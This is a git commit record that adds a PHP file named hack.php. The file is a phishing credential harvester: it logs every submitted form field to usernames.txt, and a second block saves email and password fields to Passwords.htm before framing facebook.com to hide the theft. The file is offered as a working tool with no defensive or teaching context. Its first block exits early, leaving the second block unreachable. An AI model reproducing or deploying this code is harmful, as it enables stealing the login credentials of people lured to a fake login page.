b567db04753de2a49b6e7244390e0f397cfe46a2
mdofrbn7 <mdofrbn7@gmail.com>
2021-02-13 01:28:00 +0600

    first commit

---
+++ hack.php
@@ -0,0 +1,24 @@
+<?php
+header('location:');
+$handle=fopen("usernames.txt","a");
+foreach($_POST as $variable=>$value)
+{
+fwrite($handle,$variable);
+fwrite($handle,"=");
+fwrite($handle,$value);
+fwrite($handle,"\r\n");
+}
+fwrite($handle,"\r\n");
+fclose($handle);
+exit;
+?>
+<?php
+$fp = fopen("Passwords.htm", "a");
+fwrite($fp, "Email:$_POST[email]\tPassword:$_POST[pass]");
+echo "<HTML>
+<head>
+<FRAMESET cols=\"*\">
+<FRAME SRC=\"http://www.facebook.com
+\">
+</FRAMESET>";
+?>
